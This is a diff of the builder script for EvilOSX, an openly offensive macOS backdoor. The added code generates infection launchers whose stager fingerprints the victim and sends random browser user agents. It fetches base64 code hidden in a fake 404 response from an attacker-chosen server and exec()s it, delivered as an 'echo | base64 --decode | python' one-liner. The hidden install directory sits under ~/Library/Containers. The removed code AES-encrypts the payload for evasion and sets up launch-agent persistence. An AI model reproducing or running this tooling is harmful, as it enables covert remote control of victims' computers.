@@ -1,135 +1,196 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""Builds EvilOSX which is run on the target system."""
+"""Builds launchers which are used to infect the target system."""
 __author__ = "Marten4n6"
 __license__ = "GPLv3"
 
-import os
+import json
 import random
 import string
+from base64 import b64encode
+from os import path, mkdir
 from sys import exit
+from textwrap import dedent
+from uuid import uuid4
 
-MESSAGE_INPUT = "\033[1m" + "[?] " + "\033[0m"
-MESSAGE_INFO = "\033[94m" + "[I] " + "\033[0m"
-MESSAGE_ATTENTION = "\033[91m" + "[!] " + "\033[0m"
+from bot import launchers, loaders
+from server.modules.helper import DATA_DIRECTORY
+
+MESSAGE_INPUT = "[\033[1m?\033[0m] "
+MESSAGE_INFO = "[\033[94mI\033[0m] "
+MESSAGE_ATTENTION = "[\033[91m!\033[0m] "
 
 
-def random_string(size, numbers=False):
-    """:return A randomly generate string of x characters."""
-    name = ""
+def _get_random_user_agent() -> str:
+    """:return: A random user agent."""
+    # Taken from https://techblog.willshouse.com/2012/01/03/most-common-user-agents/
+    user_agents = [
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0.3 Safari/604.5.6",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
+    ]
+    return random.choice(user_agents)
+
+
+def _get_random_string(size: int = random.randint(6, 15), numbers: bool = False) -> str:
+    """:return: A randomly generated string of x characters."""
+    result = ""
+
     for i in range(0, size):
         if not numbers:
-            name += random.choice(string.ascii_letters)
+            result += random.choice(string.ascii_letters)
         else:
-            name += random.choice(string.ascii_letters + string.digits)
-    return name
+            result += random.choice(string.ascii_letters + string.digits)
+    return result
 
 
-def get_aes_key():
-    """:return A tuple containing the salt, key and IV."""
-    output = os.popen("openssl enc -aes-256-cbc -k %s -P -md sha256" % random_string(69, numbers=True)).read()
-    salt = ""
-    key = ""
-    iv = ""
+def create_stager(server_host: str, server_port: int, loader_options: dict) -> str:
+    """:return: The stager which the launcher will execute."""
+    stager_host = "http://{}:{}".format(server_host, server_port)
 
-    for line in output.split("\n"):
-        line = line.replace(" ", "")
+    # Small piece of code which starts the staging process.
+    # (Runs the loader returned by the server).
+    stager_code = dedent("""\
+    # -*- coding: utf-8 -*-
+    import urllib2
+    from base64 import b64encode, b64decode
+    import getpass
+    from uuid import getnode
+    from binascii import hexlify
 
-        if line.startswith("salt="):
-            salt = line.split("=")[1]
-        elif line.startswith("key="):
-            key = line.split("=")[1]
-        elif line.startswith("iv="):
-            iv = line.strip().split("=")[1]
-    return salt, key, iv
+    
+    def get_uid():
+        return hexlify(getpass.getuser() + "-" + str(getnode()))
+
+    
+    {0} = "{1}"
+    data = {{
+        "Cookie": "session=" + b64encode(get_uid()) + "-{2}",
+        "User-Agent": "{3}"
+    }}
+        
+    try:
+        request = urllib2.Request("{4}", headers=data)
+        urllib2.urlopen(request).read()
+    except urllib2.HTTPError as ex:
+        if ex.code == 404:
+            exec(b64decode(ex.read().split("DEBUG:\\n")[1].replace("DEBUG-->", "")))
+        else:
+            raise
+    """.format(
+        _get_random_string(), _get_random_string(numbers=True),
+        b64encode("{}".format(json.dumps({
+            "type": 0,
+            "payload_options": {"host": server_host, "port": server_port},
+            "loader_options": loader_options
+        })).encode()).decode(),
+        _get_random_user_agent(),
+        stager_host
+    ))
+
+    return "echo {} | base64 --decode | python".format(b64encode(stager_code.encode()).decode())
+
+
+def setup():
+    """Creates the required directories used by the server."""
+    directories = [
+        DATA_DIRECTORY,
+        path.join(DATA_DIRECTORY, "builds"),
+        path.join(DATA_DIRECTORY, "output")
+    ]
+
+    for directory in directories:
+        if not path.exists(directory):
+            mkdir(directory)
 
 
 def main():
-    build_input = os.path.dirname(os.path.realpath(__file__)) + "/EvilOSX.py"
-    build_output = os.path.dirname(os.path.realpath(__file__)) + "/builds/EvilOSX-" + random_string(8) + ".py"
+    setup()
 
-    if not os.path.exists(build_input):
-        print MESSAGE_ATTENTION + "Failed to find EvilOSX.py in current directory."
-        exit(0)
-    if not os.path.exists("builds"):
-        os.mkdir("builds")
+    server_host = input(MESSAGE_INPUT + "Server host (where EvilOSX will connect to): ")
+    server_port = int(input(MESSAGE_INPUT + "Server port: "))
+    program_directory = input(MESSAGE_INPUT + "Where should EvilOSX live? [ENTER for ~/Library/Containers/.<RANDOM>]: ")
 
-    try:
-        server_host = raw_input(MESSAGE_INPUT + "Server IP (where EvilOSX will connect to): ")
-        server_port = int(raw_input(MESSAGE_INPUT + "Server port: "))
-        launch_agent_name = raw_input(MESSAGE_INPUT + "Launch agent name (empty for com.apple.EvilOSX): ")
-        disable_persistence = raw_input(MESSAGE_INPUT + "Disable persistence? [y/N] ").lower()
+    if not program_directory:
+        random_directory = "~/Library/Containers/.{}".format(_get_random_string())
 
-        if not launch_agent_name:
-            launch_agent_name = "com.apple.EvilOSX"
-        if not disable_persistence or disable_persistence == "n":
-            disable_persistence = False
-        else:
-            disable_persistence = True
+        program_directory = random_directory
+        print(MESSAGE_INFO + "Using: {}".format(random_directory))
 
-        if server_host.strip() == "":
-            print MESSAGE_ATTENTION + "Invalid server host."
-            exit(0)
-        elif server_port == "":
-            print MESSAGE_ATTENTION + "Invalid server port."
-            exit(0)
+    # Select a launcher
+    launcher_names = launchers.get_names()
 
-        print MESSAGE_INFO + "Configuring EvilOSX..."
+    print(MESSAGE_INFO + "{} available launchers: ".format(len(launcher_names)))
+    for i, launcher_name in enumerate(launcher_names):
+        print("{} = {}".format(str(i), launcher_name))
 
-        # Set variables
-        with open(build_input, "r") as input_file, open(build_output, "w+") as output_file:
-            for line in input_file:
-                if line.startswith("# Random Hash: "):
-                    output_file.write("# Random Hash: %s\n" % (
-                        random_string(random.randint(10, 69), numbers=True)
-                    ))
-                elif line.startswith("SERVER_HOST = "):
-                    output_file.write("SERVER_HOST = \"%s\"\n" % server_host)
-                elif line.startswith("SERVER_PORT = "):
-                    output_file.write("SERVER_PORT = %s\n" % server_port)
-                elif line.startswith("DEVELOPMENT = "):
-                    output_file.write("DEVELOPMENT = False\n")
-                elif line.startswith("LAUNCH_AGENT_NAME = "):
-                    output_file.write("LAUNCH_AGENT_NAME = \"%s\"\n" % launch_agent_name)
-                elif line.startswith("DISABLE_PERSISTENCE = "):
-                    output_file.write("DISABLE_PERSISTENCE = %s\n" % disable_persistence)
-                else:
-                    output_file.write(line)
+    while True:
+        try:
+            selected_launcher = input(MESSAGE_INPUT + "Launcher to use [ENTER for 1]: ")
 
-        print MESSAGE_INFO + "Encrypting with AES 256 (using system OpenSSL)..."
+            if not selected_launcher:
+                selected_launcher = 1
+            else:
+                selected_launcher = int(selected_launcher)
 
-        # AES 256 encrypt the launcher
-        with open("builds/tmp_file.py", "w+") as output_file:
-            salt, key, iv = get_aes_key()
+            selected_launcher = launcher_names[selected_launcher]
+            break
+        except (ValueError, IndexError):
+            continue
 
-            print "[DEBUG] Salt: " + salt
-            print "[DEBUG] Key: " + key
-            print "[DEBUG] IV: " + iv
+    # Select a loader
+    loader_names = loaders.get_names()
 
-            encrypt_command = "cat %s | base64 | openssl aes-256-cbc -e -a -k %s -iv %s -S %s -md sha256" % (
-                build_output, key, iv, salt
-            )
-            encrypted = "".join(os.popen(encrypt_command).readlines()).replace("\n", "")
+    print(MESSAGE_INFO + "{} available loaders: ".format(len(loader_names)))
+    for i, loader_name in enumerate(loader_names):
+        print("{} = {} ({})".format(str(i), loader_name, loaders.get_info(loader_name)["Description"]))
 
-            output_file.write("#!/usr/bin/env python\n")  # The launch agent won't be able to run the script otherwise!
-            output_file.write("# -*- coding: utf-8 -*-\n")
-            output_file.write("# %s\n" % random_string(random.randint(10, 69), numbers=True))
-            output_file.write("import os\n")
-            output_file.write("exec(\"\".join(os.popen(\"echo %s | openssl aes-256-cbc -A -d -a -k %s -iv %s -S %s -md sha256 | base64 --decode\").readlines()))\n" % (
-                encrypted, key, iv, salt
-            ))
+    while True:
+        try:
+            selected_loader = input(MESSAGE_INPUT + "Loader to use [ENTER for 0]: ")
 
-            # Replace the unencrypted file with the final encrypted version.
-            os.rename("builds/tmp_file.py", build_output)
+            if not selected_loader:
+                selected_loader = 0
+            else:
+                selected_loader = int(selected_loader)
 
-        print MESSAGE_INFO + "Done! Built file located at: %s" % os.path.realpath(build_output)
-    except ValueError:
-        print MESSAGE_ATTENTION + "Invalid server port."
+            selected_loader = loader_names[selected_loader]
+            break
+        except (ValueError, IndexError):
+            continue
+
+    set_options = []
+
+    for option_message in loaders.get_option_messages(selected_loader):
+        set_options.append(input(MESSAGE_INPUT + option_message))
+
+    # Loader setup
+    loader_options = loaders.get_options(selected_loader, set_options)
+    loader_options["program_directory"] = program_directory
+
+    # Create the launcher
+    print(MESSAGE_INFO + "Creating the \"{}\" launcher...".format(selected_launcher))
+    stager = create_stager(server_host, server_port, loader_options)
+
+    launcher_extension, launcher = launchers.generate(selected_launcher, stager)
+    launcher_path = path.realpath(path.join(path.dirname(__file__), "data", "builds", "Launcher-{}.{}".format(
+        str(uuid4())[:6], launcher_extension
+    )))
+
+    with open(launcher_path, "w") as output_file:
+        output_file.write(launcher)
+
+    print(MESSAGE_INFO + "Launcher written to: {}".format(launcher_path))
 
 
 if __name__ == '__main__':
     try:
         main()
     except KeyboardInterrupt:
-        print "\n" + MESSAGE_INFO + "Interrupted."
+        print("\n" + MESSAGE_ATTENTION + "Interrupted.")
         exit(0)
